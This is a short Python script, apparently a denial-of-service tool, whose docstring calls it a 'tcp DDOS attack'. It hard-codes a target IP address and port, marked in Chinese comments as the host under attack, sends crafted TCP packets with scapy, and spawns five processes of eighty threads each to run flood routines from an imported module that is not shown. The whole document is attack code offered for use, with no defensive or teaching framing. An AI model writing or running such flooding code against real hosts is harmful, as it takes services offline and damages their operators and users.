#!/usr/bin/env python3

from scapy.all import *
import multiprocessing
import threading
import protocol2

"""tcp DDOS attack"""

host = "11.2.77.3"  #被攻击主机
port = 30088  #被攻击主机端口
sp = 1025  
ll = threading.Lock() #线程锁，防止重复端口

def tcp_ack(h,p):
    ll.acquire()
    global sp
    sp += 1
    ll.release()
    response = IP(dst=h)/TCP(dport=p,sport=sp)
    send(response)

def mutil_threading():
    job = []
    for i in range(80):
        #t = threading.Thread(target=protocol.run,args=(host,port))
        t = threading.Thread(target=protocol2.run,args=())
        job.append(t)
        t.start()
    for j in job:
        j.join()

def multi_process(count):
    for i in range(count):
        p = multiprocessing.Process(target=mutil_threading,args=())
        p.start()

if __name__ == "__main__":
    print('attack is start..')
    tcp_ack(host,port)
    try:
        for i in range(1):
            multi_process(5)
    except KeyboardInterrupt:
        print('attack end')
